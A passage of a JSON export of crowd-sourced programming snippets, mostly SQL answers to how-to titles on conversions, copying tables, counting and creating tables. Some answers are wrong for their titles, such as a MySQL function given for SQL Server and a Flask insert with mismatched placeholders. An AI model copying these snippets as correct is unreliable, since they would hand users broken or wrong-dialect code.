    "description": "ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col_name);  ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col1, col2); -- Multiple ALTER TABLE table_name ADD col_name NUMBER UNIQUE;\t\t\t\t  \t-- New field\nThis constraint ensures all values in a column are unique. Example 1 (MySQL): Adds a unique constraint to the id column when creating a new users table. CREATE TABLE users ( id int NOT NULL, name varchar(255) NOT NULL, UNIQUE (id) ); Example 2 (MySQL): Alters an existing column to add a UNIQUE constraint. ALTER TABLE users ADD UNIQUE (id);\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 581,
    "keyword": null,
    "link": null,
    "title": " continue in sql",
    "description": "DECLARE @counter INT = 0; WHILE @counter < 5 BEGIN     SET @counter = @counter + 1;     IF @counter = 3         CONTINUE;\t     PRINT @counter; END // 1 2 4 5\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 582,
    "keyword": null,
    "link": null,
    "title": " convert .mdf to .bak",
    "description": "BACKUP DATABASE [NameOfDatabase] TO  DISK = N'D:\\path\\filename.bak' WITH NOFORMAT, NOINIT,  NAME = N'NameOfDatabase-Full Database Backup', SKIP, NOREWIND, NOUNLOAD,  STATS = 10\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 583,
    "keyword": null,
    "link": null,
    "title": " convert data type in sql",
    "description": "# There are two ways to change data type. By using CAST or :: # Eg. CAST (column_name AS target_type) OR column_name::target_type  SELECT \tCAST (date_occurred AS DATE)     CAST (total_amount AS INTEGER)     CAST (duration AS INTERVAL) # OR         date_occurred::DATE     total_amount::INTEGER     duration::INTERVAL\nCast( '2011-07-07' as date ) as convertedDate\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 584,
    "keyword": null,
    "link": null,
    "title": " convert date to dd/mm/yyyy sql",
    "description": "SELECT CONVERT(varchar(10), CONVERT(date, '13/12/2016', 103), 120)\nCast( '2011-07-07' as date ) as convertedDate\nselect CONVERT(char(10), GetDate(),103) /* 30/06/2021 */\nselect CONVERT(char(10), GetDate(),126) /* 2020-12-23 */\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 585,
    "keyword": null,
    "link": null,
    "title": " convert epoch to date in sql server",
    "description": "SELECT FROM_UNIXTIME(FLOOR(EPOCH_TIMESTAMP/1000)) FROM table; --if milliseconds SELECT FROM_UNIXTIME(FLOOR(EPOCH_TIMESTAMP)) FROM table; --no milliseconds\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 586,
    "keyword": null,
    "link": null,
    "title": " convert excel to sql",
    "description": "Using SQLizer... Step 1: Select Excel as your file type Step 2: Choose the Excel file you want to convert to SQL Step 3: Select whether the first row contains data or column names Step 4: Type the name of the Excel worksheet that holds your data Step 5: Input the cell range of the data that you want to convert Step 6: Type in a name for your database table Step 7: Convert your file!\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 587,
    "keyword": null,
    "link": null,
    "title": " convert float to int sql",
    "description": "Better to use CAST INT/CEILING/FLOOR:  SELECT CEILING(1235.53) SELECT FLOOR(1235.53) SELECT CAST(1235.53 AS INT)\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 588,
    "keyword": null,
    "link": null,
    "title": " convert int to varchar sql",
    "description": "SELECT convert(varchar(10), field_name) FROM table_name; SELECT str(field_name) FROM table_name;\n",
    "reg_date": "2021-10-12T09:54:33.000Z"
  },
  {
    "id": 589,
    "keyword": null,
    "link": null,
    "title": " convert money to varchar sql server",
    "description": "SELECT convert(varchar(30), moneyfield, 1)\n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 590,
    "keyword": null,
    "link": null,
    "title": " convert multiple columns to ROws in sql server",
    "description": "select *   from yourTable   unpivot (     Value     for NewCol in (Value1, Value2, Value3,Value4, Value5)   ) up \n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 591,
    "keyword": null,
    "link": null,
    "title": " convert polygon to text in mysql",
    "description": "ST_AsText(g)\n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 592,
    "keyword": null,
    "link": null,
    "title": " convert rows to columns in sql server",
    "description": "-- convert rows to columns in sql server (PIVOT) SELECT Firstname, Amount, PostalCode FROM (          SELECT value, columnname          FROM yourtable      ) d PIVOT (     max(value)     FOR columnname IN (Firstname, Amount, PostalCode) ) piv;\n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 593,
    "keyword": null,
    "link": null,
    "title": " convert rows to string sql server",
    "description": "Select CountryName from Application.Countries    Declare @val Varchar(MAX);  Select @val = COALESCE(@val + ', ' + CountryName, CountryName)          From Application.Countries Select @val; \n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 594,
    "keyword": null,
    "link": null,
    "title": " convert series number to date in sql",
    "description": "dateadd(d,36464,'1899-12-30')\n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 595,
    "keyword": null,
    "link": null,
    "title": " convert sql server guid to varbinary",
    "description": "select cast(hashbytes('md5','foo') as uniqueidentifier) \n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 596,
    "keyword": null,
    "link": null,
    "title": " convert sqlite table to pandas dataframe",
    "description": "import sqlite3 import pandas as pd  dat = sqlite3.connect('data.db') query = dat.execute(\"SELECT * From <TABLENAME>\") cols = [column[0] for column in query.description] results= pd.DataFrame.from_records(data = query.fetchall(), columns = cols)\n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 597,
    "keyword": null,
    "link": null,
    "title": " convert time interval to int in sql",
    "description": "# The 'time_interval' is the variable/column name.  EXTRACT (epoch FROM time_interval) #This gives you the value of the interval in seconds.  #Divide it by the number of seconds per period to get it in other time duration formats. #Eg. minutes, days, hours etc.  EXTRACT (epoch FROM time_interval)/60 #for minutes  EXTRACT (epoch FROM time_interval)/3600 #for hours  EXTRACT (epoch FROM time_interval)/86400 #for days...  \n",
    "reg_date": "2021-10-12T09:54:34.000Z"
  },
  {
    "id": 598,
    "keyword": null,
    "link": null,
    "title": " convert to hexadecimal sql",
    "description": "to_hex() or TO_HEX(); \n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 599,
    "keyword": null,
    "link": null,
    "title": " convert tz mysql",
    "description": "CONVERT_TZ(datetime, from_tz, to_tz)  Example:  SELECT CONVERT_TZ('2031-09-21 02:42:14', 'UTC', 'America/New_York'); output: 2031-09-20 22:42:14 \n##Syntax:  ##CONVERT_TZ(datetime, from_tz, to_tz)  SELECT CONVERT_TZ('2008-05-15 12:00:00','+00:00','+10:00'); ##Output: 2008-05-15 22:00:00\n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 600,
    "keyword": null,
    "link": null,
    "title": " convert utc to est sql",
    "description": "select CONVERT(datetime, SWITCHOFFSET(dateTimeField, DATEPART(TZOFFSET,  dateTimeField AT TIME ZONE 'Eastern Standard Time')))\nselect   [MyUtcDate] + getdate() - getutcdate() from [dbo].[mytable]\n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 601,
    "keyword": null,
    "link": null,
    "title": " convert varchar to int in sqlite",
    "description": "CAST(myStringNum as REAL) CAST(myStringNum as INT) CAST(myStringNum as DOUBLE)\n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 602,
    "keyword": null,
    "link": null,
    "title": " copy all values of a column to another column in sql in same table",
    "description": "UPDATE table SET columnB = columnA; \n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 603,
    "keyword": null,
    "link": null,
    "title": " copy column from one table to another without column duplicate postgres",
    "description": "//Postgres Database Query insert into table1(column1,column2) select c1,c2   from table2 a  where not exists ( select 0 from table1 b where b.id = a.id ) \n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 604,
    "keyword": null,
    "link": null,
    "title": " copy data from one database to another",
    "description": "INSERT INTO dbo.YourTableNameHere    SELECT *    FROM [SourceServer].[SourceDatabase].dbo.YourTableNameHere\nCopy CodeSelect * into DestinationDB.dbo.tableName from SourceDB.dbo.SourceTable \nLet&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 605,
    "keyword": null,
    "link": null,
    "title": " copy data from one postgres container to another",
    "description": "docker exec -t your-db-container pg_dumpall -c -U postgres > dump_`date +%d-%m-%Y\"_\"%H_%M_%S`.sql cat your_dump.sql | docker exec -i your-db-container psql -U postgres\n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 606,
    "keyword": null,
    "link": null,
    "title": " copy data from one table to another",
    "description": "Let&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:54:35.000Z"
  },
  {
    "id": 607,
    "keyword": null,
    "link": null,
    "title": " copy data from one table to another mysql",
    "description": "CREATE TABLE new_table  SELECT col1, col2, col3  FROM     existing_table WHERE     conditions;\nINSERT INTO table2 (st_id,uid,changed,status,assign_status) SELECT st_id,from_uid,now(),'Pending','Assigned' FROM table1 \n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 608,
    "keyword": null,
    "link": null,
    "title": " copy database mysql",
    "description": "// if you didnt create the target db, do it: mysql -u your_user -p  > CREATE DATABASE the_db_cloned_name; > SHOW DATABASES  // then check if it is created and so you're ready to proceed mysqldump -u your_user -p the_db_name > /directory/file_name.sql mysql -u your_user -p the_db_cloned_name < /directory/file_name.sql\nmysqldump -u root -p db_caweb | mysql -u root -p root db_caweb_23012021; \n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 609,
    "keyword": null,
    "link": null,
    "title": " copy from one table to another postgres using matching column",
    "description": "UPDATE Table2 --format schema.table_name SET  ref_id2 = table1.ref_id1 FROM table1 -- mention schema name WHERE table1.id = table2.id AND  table1.a_ref1 = table2.b_ref1;\n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 610,
    "keyword": null,
    "link": null,
    "title": " copy one column data to another in sql",
    "description": "UPDATE table SET columnB = columnA; \n#copy one column data to another in sql  Syntax  UPDATE `table` SET new_column_name = old_column_name;  Example UPDATE `toppers` SET tpicx = tpic;\nUPDATE table_name SET     destination_column_name=orig_column_name WHERE condition_if_necessary \n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 611,
    "keyword": null,
    "link": null,
    "title": " copy postgres table from one schema into another",
    "description": "create table schema2.the_table (like schema1.the_table including all); insert into schema2.the_table select *  from schema1.the_table;\n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 612,
    "keyword": null,
    "link": null,
    "title": " copy table db",
    "description": "USE database;  CREATE TABLE newTable LIKE oldTable;  INSERT INTO newTable SELECT * FROM oldTable;\n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 613,
    "keyword": null,
    "link": null,
    "title": " copy table from redshift to s3",
    "description": "UNLOAD ('select * from my_schema.my_table')     to 's3://bucket-name/file_&rsquo;  iam_role 'arn:aws:iam::482569874589:role/RedshiftLoaderRole&rsquo;;\n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 614,
    "keyword": null,
    "link": null,
    "title": " copy table oracle",
    "description": "CREATE TABLE New_Table_name AS SELECT * FROM Existing_table_Name; \n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 615,
    "keyword": null,
    "link": null,
    "title": " copy table postgres",
    "description": "create table schema2.the_table (like schema1.the_table including all); insert into schema2.the_table select *  from schema1.the_table;\nCREATE TABLE new_table AS  TABLE existing_table; \nCREATE TABLE new_table AS  SELECT * FROM     existing_table WHERE     condition;\n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 616,
    "keyword": null,
    "link": null,
    "title": " copy table sql server",
    "description": "-- Use SELECT ... INTO: SELECT * INTO my_table_1 FROM my_table; -- Structure only: SELECT * INTO my_table_1 FROM my_table WHERE 1 <> 1;\n",
    "reg_date": "2021-10-12T09:54:36.000Z"
  },
  {
    "id": 617,
    "keyword": null,
    "link": null,
    "title": " copy value from one column to another postgres",
    "description": "UPDATE table SET columnB = columnA;\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 618,
    "keyword": null,
    "link": null,
    "title": " copying data from one table to another in sql",
    "description": "Let&rsquo;s assume that, we have our employee table. We have to copy this data into another table. For this purpose, we can use the INSERT INTO SELECT operator. Before we go ahead and do that, we would have to create another table that would have the same structure as the given table. &bull; First create the second table with the same table structure with copied one. &bull; Then use the syntax: Let&rsquo;s say employee_duplicate is New table employee is First table that we want to copy it into new table  INSERT INTO employee_duplicate SELECT * FROM employee;\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 619,
    "keyword": null,
    "link": null,
    "title": " copying query result to excel",
    "description": "COPY (SELECT * FROM tracks WHERE genre_id = 6) TO '/Users/dave/Downloads/blues_tracks.csv' DELIMITER ',' CSV HEADER;\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 620,
    "keyword": null,
    "link": null,
    "title": " correlated subquery",
    "description": "A correlated subquery is a way of reading values in each row and comparing those values in each row with related data.  A correlated subquery is evaluated once for each row processed by the parent query. i.e. the subquery returns a value for each row processed by the parent query unlike the normal subquery which executes only once and returns the data to the parent query for processing.  SELECT last_name, salary, department_id FROM employees outer WHERE salary > (SELECT AVG(salary)                 FROM employees                 WHERE department_id = outer.department_id                );  Here the inner query (correlated subquery) generates the avg salary for each department_id processed by the outer query.\nNoncorrelated Subqueries A noncorrelated subquery executes independently of the outer query. The subquery executes first, and then passes its results to the outer query, For example:  => SELECT name, street, city, state FROM addresses WHERE state IN (SELECT state FROM states);  Correlated Subqueries A correlated subquery typically obtains values from its outer query before it executes. When the subquery returns, it passes its results to the outer query.  => SELECT name, street, city, state FROM addresses      WHERE EXISTS (SELECT * FROM states WHERE states.state = addresses.state);\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 621,
    "keyword": null,
    "link": null,
    "title": " could not assemble any primary key columns for mapped table sqlalchemy",
    "description": "1. Make sure all your tables have a primary key and you set the __table__ = 'name' 2. execute the following underneath declared table models with Session(engine) as session:         Base.metadata.create_all(engine)         session.commit()\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 622,
    "keyword": null,
    "link": null,
    "title": " could not execute statement; sql [n/a]; constraint [null]; nested exception is org.hibernate.exception.constraintviolationexception: could not execute statement",
    "description": "@Entity @Table(name = \"bankuser\") public class User implements java.io.Serializable {      /**      *       */     private static final long serialVersionUID = 6447416794596398975L;      @Id     @GeneratedValue(strategy = GenerationType.IDENTITY)     @Column(name = \"id\", unique = true, nullable = false)     private Long id;      @Column(name = \"firstname\", length = 50)     private String firstname;      @Column(name = \"lastname\", length = 50)     private String lastname;      public User() {     }      public User(Long id) {         this.id = id;     }      public User(Long id, String firstname, String lastname, String designation, Integer salary) {         this.id = id;         this.firstname = firstname;         this.lastname = lastname;      }      public User(String firstname, String lastname, String designation, Integer salary) {         this.firstname = firstname;         this.lastname = lastname;     }      public Long getId() {         return this.id;     }      public void setId(Long id) {         this.id = id;     }      public String getFirstname() {         return this.firstname;     }      public void setFirstname(String firstname) {         this.firstname = firstname;     }      public String getLastname() {         return this.lastname;     }      public void setLastname(String lastname) {         this.lastname = lastname;     }      @Override     public String toString() {         StringBuffer sb = new StringBuffer();         sb.append(\"Id: \").append(this.id).append(\", firstName: \").append(this.firstname).append(\", lastName: \")                 .append(this.lastname);         return sb.toString();     }      @Override     public boolean equals(Object obj) {         if (this == obj)             return true;         if (id == null || obj == null || getClass() != obj.getClass())             return false;         User toCompare = (User) obj;         return id.equals(toCompare.id);     }      @Override     public int hashCode() {         return id == null ? 0 : id.hashCode();     }  }\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 623,
    "keyword": null,
    "link": null,
    "title": " could not find driver (SQL: SHOW FULL TABLES WHERE table type = 'BASE TABLE')",
    "description": "You might need to comment out the following in your php.ini file. ;extension=pdo_mysql.so  ############# OR ############## Other solution might be you may have a missing dependency  If you can, run : composer update  composer require doctrine/dbal \nsudo apt-get install php-sqlite3 \n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 624,
    "keyword": null,
    "link": null,
    "title": " could not find driver (SQL: select * from information schema.tables where table schema = francis koopmart and table name = migrations and table type = 'BASE TABLE')",
    "description": "If your php.ini file exists then in configuration file simply uncomment the extension:  ;extension=php_pdo_mysql.dll   Else follow below steps  step1:php -v  step2: Install php mysql extension  php 7.0 sudo apt-get install php7.0-mysql  php 7.1 sudo apt-get install php7.1-mysql  php 7.2 sudo apt-get install php7.2-mysql  php 7.3 sudo apt-get install php7.3-mysql  step3: service apache2 restart  step4: php artisan migrate \n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 625,
    "keyword": null,
    "link": null,
    "title": " could not find driver (SQL: select * from information schema.tables where table schema = pics and table name = migrations and table type = 'BASE TABLE')",
    "description": "just uncomment ;extension=pdo_mysql.dll in the php.ini file\n;extension=php_pdo_mysql.dll \n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 626,
    "keyword": null,
    "link": null,
    "title": " count characters of string mysql",
    "description": "SELECT         LENGTH(<column_name>) AS length      FROM <table> WHERE...\n",
    "reg_date": "2021-10-12T09:54:37.000Z"
  },
  {
    "id": 627,
    "keyword": null,
    "link": null,
    "title": " count database access django",
    "description": ">>> from django.conf import settings >>> settings.DEBUG = True >>> from django.db import connection >>> Model.objects.count() >>> # python 3 uses print() >>> print(len(connection.queries)) 1 \n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 628,
    "keyword": null,
    "link": null,
    "title": " count distinct sql",
    "description": "SELECT COUNT (DISTINCT column-name)  FROM table-name\ndb.collection.distinct('field').length\nSELECT COUNT(DISTINCT program_name) AS Count,   program_type AS [Type]  FROM cm_production  WHERE push_number=@push_number  GROUP BY program_type\nSELECT DISTINCT Column_name FROM table_name;\nSELECT COUNT(DISTINCT column-name) FROM table-name\n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 629,
    "keyword": null,
    "link": null,
    "title": " count if in mysql",
    "description": "COUNT(CASE WHEN A LIKE 'Marvin%' THEN 1 END)\n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 630,
    "keyword": null,
    "link": null,
    "title": " count in sql and diff",
    "description": "select (count(city)-count(distinct city)) from station; \n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 631,
    "keyword": null,
    "link": null,
    "title": " count mysql server db tables",
    "description": "SELECT count(*)    FROM INFORMATION_SCHEMA.TABLES    WHERE TABLE_SCHEMA = 'yourDatabaseName';\n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 632,
    "keyword": null,
    "link": null,
    "title": " count number of entires by months sql",
    "description": "select month(DepotArrivalDate), count(*) from tbl_CMS_Container WHERE     year(DepotArrivalDate) = '2013'  group by month(DepotArrivalDate) \n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 633,
    "keyword": null,
    "link": null,
    "title": " count of tables in database mysql",
    "description": "SELECT count(*)  FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'database_name'\n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 634,
    "keyword": null,
    "link": null,
    "title": " count subquery sql",
    "description": "/*count sub query Depends on the use case, here are a few options*/  Select Count(*) from  ( --Sub query Select id from users  ) as userCount  Select * from  ( --Sub query select count(id) as cnt from Users where LastPasswordChangedDate < '2021-01-01' ) as LastPasswordChangedDate  Select  ( \t--Sub query \tselect count(id) as cnt from Users where LastPasswordChangedDate < '2021-01-01' ) as LastPasswordChangedDateCount , * from Users where LastPasswordChangedDate < '2021-01-01' \n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 635,
    "keyword": null,
    "link": null,
    "title": " count with where",
    "description": "select count(case Position when 'Manager' then 1 else null end) from ...   select sum(case Position when 'Manager' then 1 else 0 end) from ...\nselect count(case Position when 'Manager' then 1 else null end) from ...\n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 636,
    "keyword": null,
    "link": null,
    "title": " créer une table sql",
    "description": "CREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )\n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 637,
    "keyword": null,
    "link": null,
    "title": " create  table",
    "description": "# Simple table describing a vehicle  CREATE TABLE vehicle(   \t# vehicleId: Unique ID for Primary Key.   \t# This is how we will reference a record \tvehicleId INT NOT NULL,     \tmake VARCHAR(64), # String 64 chars max   \tmodel VARCHAR(128),   \tderivative VARCHAR(255),   \tPRIMARY KEY(vehicleId) );  # Add a record INSERT INTO vehicle VALUES(1000,'Volkswagen','Golf','1.5 TSI EVO Match Edition 5dr');\nCREATE TABLE fact ( id SERIAL PRIMARY KEY NOT NULL, type VARCHAR(255), text TEXT );  \n",
    "reg_date": "2021-10-12T09:54:38.000Z"
  },
  {
    "id": 638,
    "keyword": null,
    "link": null,
    "title": " create a PostgreSQL user django on mac",
    "description": "$ psql -h localhost \n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 639,
    "keyword": null,
    "link": null,
    "title": " create a api + python + mysql",
    "description": "import pymysql from app import app from config import mysql from flask import jsonify from flask import flash, request \t\t @app.route('/add', methods=['POST']) def add_emp(): \ttry: \t\t_json = request.json \t\t_name = _json['name'] \t\t_email = _json['email'] \t\t_phone = _json['phone']         _address = _json['address']\t\t \t\tif _name and _email and _phone and _address and request.method == 'POST':\t\t\t \t\t\tsqlQuery = \"INSERT INTO rest_emp(name, email, phone, address) VALUES(%s, %s, %s, %s, %s)\" \t\t\tbindData = (_name, _email, _phone, _address) \t\t\tconn = mysql.connect() \t\t\tcursor = conn.cursor() \t\t\tcursor.execute(sqlQuery, bindData) \t\t\tconn.commit() \t\t\trespone = jsonify('Employee added successfully!') \t\t\trespone.status_code = 200 \t\t\treturn respone \t\telse: \t\t\treturn not_found() \texcept Exception as e: \t\tprint(e) \tfinally: \t\tcursor.close()  \t\tconn.close() \t\t @app.route('/emp') def emp(): \ttry: \t\tconn = mysql.connect() \t\tcursor = conn.cursor(pymysql.cursors.DictCursor) \t\tcursor.execute(\"SELECT id, name, email, phone, address FROM rest_emp\") \t\tempRows = cursor.fetchall() \t\trespone = jsonify(empRows) \t\trespone.status_code = 200 \t\treturn respone \texcept Exception as e: \t\tprint(e) \tfinally: \t\tcursor.close()  \t\tconn.close() \t\t @app.route('/emp/<int:id>') def emp(id): \ttry: \t\tconn = mysql.connect() \t\tcursor = conn.cursor(pymysql.cursors.DictCursor) \t\tcursor.execute(\"SELECT id, name, email, phone, address FROM rest_emp WHERE id =%s\", id) \t\tempRow = cursor.fetchone() \t\trespone = jsonify(empRow) \t\trespone.status_code = 200 \t\treturn respone \texcept Exception as e: \t\tprint(e) \tfinally: \t\tcursor.close()  \t\tconn.close()  @app.route('/update', methods=['PUT']) def update_emp(): \ttry: \t\t_json = request.json \t\t_id = _json['id'] \t\t_name = _json['name'] \t\t_email = _json['email'] \t\t_phone = _json['phone']                 _address = _json['address']                 if _name and _email and _phone and _address and _id and request.method == 'PUT':\t\t\t \t\t\tsqlQuery = \"UPDATE rest_emp SET name=%s, email=%s, phone=%s, address=%s WHERE id=%s\" \t\t\tbindData = (_name, _email, _phone, _address, _id,) \t\t\tconn = mysql.connect() \t\t\tcursor = conn.cursor() \t\t\tcursor.execute(sqlQuery, bindData) \t\t\tconn.commit() \t\t\trespone = jsonify('Employee updated successfully!') \t\t\trespone.status_code = 200 \t\t\treturn respone \t\telse: \t\t\treturn not_found()\t                 except Exception as e: \t\t print(e) \t        finally: \t\t cursor.close()  \t\t conn.close() @app.route('/delete/<int:id>', methods=['DELETE']) def delete_emp(id): \ttry: \t\tconn = mysql.connect() \t\tcursor = conn.cursor() \t\tcursor.execute(\"DELETE FROM rest_emp WHERE id =%s\", (id,)) \t\tconn.commit() \t\trespone = jsonify('Employee deleted successfully!') \t\trespone.status_code = 200 \t\treturn respone \texcept Exception as e: \t\tprint(e) \tfinally: \t\tcursor.close()  \t\tconn.close() \t\t @app.errorhandler(404) def not_found(error=None):     message = {         'status': 404,         'message': 'Record not found: ' + request.url,     }     respone = jsonify(message)     respone.status_code = 404     return respone \t\t if __name__ == \"__main__\":     app.run()\n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 640,
    "keyword": null,
    "link": null,
    "title": " create a db",
    "description": "CREATE DATABASE databasename;\n#TO Create a DB : CREATE DATABASE <DB_NAME>; #example : CREATE DATABASE MyDataBase ; #To Create a Table : CREATE TABLE <TB_NAME>(     <Elem 0> <Type_of_Elem created> <ADD_PROPRETIES>, #Don't forget the comma   \t...   \t...   \t...     <Elem n> <Type_of_Elem created> #last elems don't need a comma  ); /*example : CREATE TABLE city (     id int  NOT NULL IDENTITY(1, 1),     city_name char(128)  NOT NULL,     lat decimal(9,6)  NOT NULL,     long decimal(9,6)  NOT NULL,     country_id int  NOT NULL,     CONSTRAINT city_pk PRIMARY KEY  (id) ); */ \n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 641,
    "keyword": null,
    "link": null,
    "title": " create a plsql function and call",
    "description": "CREATE OR REPLACE FUNCTION welcome_msgJune ( p_name IN VARCHAR2) RETURN VAR.CHAR2 IS BEGIN RETURN (&lsquo;Welcome &lsquo;|| p_name); END; / DECLARE lv_msg VARCHAR2(250); BEGIN lv_msg := welcome_msg_func (&lsquo;Guru99&rsquo;); dbms_output.put_line(lv_msg); END; SELECT welcome_msg_func(&lsquo;Guru99:) FROM DUAL; \n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 642,
    "keyword": null,
    "link": null,
    "title": " create a quick temp table with stored procedure sql",
    "description": "/* First you need to create a table type. */ CREATE TYPE Names AS TABLE  (Name VARCHAR(10)) ; GO   /* Next, Create a procedure to receive data for the table-valued parameter, the table of names and select one item from the table*/ CREATE PROCEDURE ChooseAName   @CandidateNames Names READONLY AS  DECLARE @candidates TABLE (NAME VARCHAR(10),                            theOrder UNIQUEIDENTIFIER) INSERT  INTO @candidates (name, theorder)         SELECT  name, NEWID()         FROM    @CandidateNames SELECT TOP 1         NAME FROM    @Candidates ORDER BY theOrder GO   /* Declare a variable that references the type for our list of cows. */ DECLARE @MyFavouriteCowName AS Names ;   /* Add data to the table variable. */ INSERT  INTO @MyFavouriteCowName (Name)  SELECT 'Bossy' UNION SELECT 'Bessy' UNION SELECT 'petal' UNION SELECT 'Daisy' UNION SELECT 'Lulu' UNION SELECT 'Buttercup' UNION SELECT 'Bertha' UNION SELECT 'Bubba' UNION SELECT 'Beauregard' UNION SELECT 'Brunhilde' UNION SELECT 'Lore' UNION SELECT 'Lotte' UNION SELECT 'Rosa' UNION SELECT 'Thilde' UNION SELECT 'Lisa' UNION SELECT 'Peppo' UNION SELECT 'Maxi' UNION SELECT 'Moriz' UNION SELECT 'Marla'   /* Pass the table with the list of traditional nemes of cows to the stored procedure. */ EXEC chooseAName @MyFavouriteCowName GO \nSET nocount ON   DECLARE @FirstTable TABLE (RandomInteger INT) DECLARE @SecondTable TABLE (RandomInteger INT) DECLARE @WhenWeStarted DATETIME DECLARE @ii INT   BEGIN TRANSACTION SET @ii = 0 WHILE @ii < 100000    BEGIN     INSERT  INTO @FirstTable     VALUES  (RAND() * 10000)     SET @ii = @ii + 1   END SET @ii = 0 WHILE @ii < 100000    BEGIN     INSERT  INTO @SecondTable     VALUES  (RAND() * 10000)     SET @ii = @ii + 1   END COMMIT TRANSACTION SELECT  @WhenWeStarted = GETDATE() SET STATISTICS PROFILE ON SELECT  COUNT(*) FROM    @FirstTable first         INNER JOIN @SecondTable second          ON first.RandomInteger = second.RandomInteger OPTION (RECOMPILE)   -- 153Ms  as opposed to 653Ms without the hint SET STATISTICS PROFILE OFF SELECT  'That took '      + CONVERT(VARCHAR(8), DATEDIFF(ms, @WhenWeStarted, GETDATE()))      + ' ms' go \n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 643,
    "keyword": null,
    "link": null,
    "title": " create a table from one field of another table",
    "description": "SQL> CREATE TABLE SALARY AS    SELECT ID, SALARY    FROM CUSTOMERS;\n",
    "reg_date": "2021-10-12T09:54:39.000Z"
  },
  {
    "id": 644,
    "keyword": null,
    "link": null,
    "title": " create a table with an id in mysql",
